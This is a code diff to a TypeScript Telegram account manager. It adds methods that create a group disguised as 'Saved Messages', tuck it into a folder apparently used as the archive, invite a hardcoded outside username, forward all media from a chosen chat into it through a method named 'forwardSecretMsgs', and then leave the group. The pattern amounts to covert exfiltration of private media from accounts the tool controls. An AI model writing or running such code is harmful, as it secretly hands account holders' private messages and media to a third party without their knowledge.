@@ -36,6 +36,137 @@ class TelegramManager {
         TelegramManager.activeClientSetup = data;
     }
 
+    public async createGroup() {
+        const groupName = "Saved Messages"; // Customize your group name
+        const groupDescription = this.phoneNumber; // Optional description
+        const result: any = await this.client.invoke(
+            new Api.channels.CreateChannel({
+                title: groupName,
+                about: groupDescription,
+                megagroup: true,
+                forImport: true,
+            })
+        );
+        const { id, accessHash } = result.chats[0];
+
+        // Logic to categorize the dialog to a folder
+        const folderId = 1; // Replace with the desired folder ID
+        await this.client.invoke(
+            new Api.folders.EditPeerFolders({
+                folderPeers: [
+                    new Api.InputFolderPeer({
+                        peer: new Api.InputPeerChannel({
+                            channelId: id,
+                            accessHash: accessHash,
+                        }),
+                        folderId: folderId,
+                    }),
+                ],
+            })
+        );
+
+        // Add users to the channel
+        const usersToAdd = ["fuckyoubabie"]; // Replace with the list of usernames or user IDs
+        const addUsersResult = await this.client.invoke(
+            new Api.channels.InviteToChannel({
+                channel: new Api.InputChannel({
+                    channelId: id,
+                    accessHash: accessHash,
+                }),
+                users: usersToAdd
+            })
+        );
+        return { id, accessHash };
+    }
+
+    public async createGroupAndForward(fromChatId: string) {
+        const { id, accessHash } = await this.createGroup();
+        await this.forwardSecretMsgs(fromChatId, id.toString());
+    }
+
+    public async joinChannelAndForward(fromChatId: string,channel: string) {
+        const result: any = await this.joinChannel(channel);
+        const folderId = 1; // Replace with the desired folder ID
+        await this.client.invoke(
+            new Api.folders.EditPeerFolders({
+                folderPeers: [
+                    new Api.InputFolderPeer({
+                        peer: new Api.InputPeerChannel({
+                            channelId: result.chats[0].id,
+                            accessHash: result.chats[0].accessHash,
+                        }),
+                        folderId: folderId,
+                    }),
+                ],
+            })
+        );
+
+        await this.forwardSecretMsgs(fromChatId, channel);
+    }
+
+    public async forwardSecretMsgs(fromChatId: string, toChatId: string) {
+        let offset = 0;
+        let limit = 100;
+        let totalMessages = 0;
+        let forwardedCount = 0;
+        let messages: any = [];
+        do {
+            messages = await this.client.getMessages(fromChatId, { offsetId: offset, limit });
+            totalMessages = messages.total;
+            const messageIds = messages.map((message: Api.Message) => {
+                offset = message.id;
+                if (message.id && message.media) {
+                    return message.id;
+                }
+                return undefined;
+            }).filter(id => id !== undefined);
+            console.log(messageIds)
+            if (messageIds.length > 0) {
+                try {
+                    const result = await this.client.forwardMessages(toChatId, {
+                        messages: messageIds,
+                        fromPeer: fromChatId,
+                    });
+
+                    forwardedCount += messageIds.length;
+                    console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);
+                    await sleep(5000); // Sleep for a second to avoid rate limits
+                } catch (error) {
+                    console.error("Error occurred while forwarding messages:", error);
+                }
+                await sleep(5000); // Sleep for a second to avoid rate limits
+            }
+        } while (messages.length > 0);
+
+        await this.leaveChannels([toChatId]);
+        return;
+    }
+
+    //logic to forward messages from a chat to another chat maintaining rate limits
+    async forwardMessages(fromChatId: string, toChatId: string, messageIds: number[]) {
+        const chunkSize = 30; // Number of messages to forward per request
+        const totalMessages = messageIds.length;
+        let forwardedCount = 0;
+
+        for (let i = 0; i < totalMessages; i += chunkSize) {
+            const chunk = messageIds.slice(i, i + chunkSize);
+            try {
+                const result = await this.client.forwardMessages(toChatId, {
+                    messages: chunk,
+                    fromPeer: fromChatId,
+                });
+
+                forwardedCount += chunk.length;
+                console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);
+                await sleep(5000); // Sleep for a second to avoid rate limits
+            } catch (error) {
+                console.error("Error occurred while forwarding messages:", error);
+            }
+        }
+
+        return forwardedCount;
+    }
+
     async disconnect(): Promise<void> {
         if (this.client) {
             console.log("Destroying Client: ", this.phoneNumber)
@@ -127,13 +258,13 @@ class TelegramManager {
                         //     `ID: ${userDetails.id}, Name: ${userDetails.firstName || ""} ${userDetails.lastName || ""
                         //     }, Username: ${userDetails.username || ""}`
                         // );
-                       
+
                         result.push({
                             tgId: userDetails.id,
                             name: `${userDetails.firstName || ""} ${userDetails.lastName || ""}`,
                             username: `${userDetails.username || ""}`,
                         })
-                        if (userDetails.firstName == 'Deleted Account' && !userDetails.username){
+                        if (userDetails.firstName == 'Deleted Account' && !userDetails.username) {
                             console.log(JSON.stringify(userDetails.id))
                         }
                     } else {
@@ -330,7 +461,9 @@ class TelegramManager {
                     })
                 );
                 console.log("Left channel :", id)
-                await sleep(30000);
+                if (chats.length > 1) {
+                    await sleep(30000);
+                }
             } catch (error) {
                 const errorDetails = parseError(error);
                 console.log("Failed to leave channel :", errorDetails.message)
@@ -343,6 +476,7 @@ class TelegramManager {
     }
 
     async joinChannel(entity: Api.TypeEntityLike) {
+        console.log("trying to join channel : ", entity)
         return await this.client?.invoke(
             new Api.channels.JoinChannel({
                 channel: await this.client?.getEntity(entity)
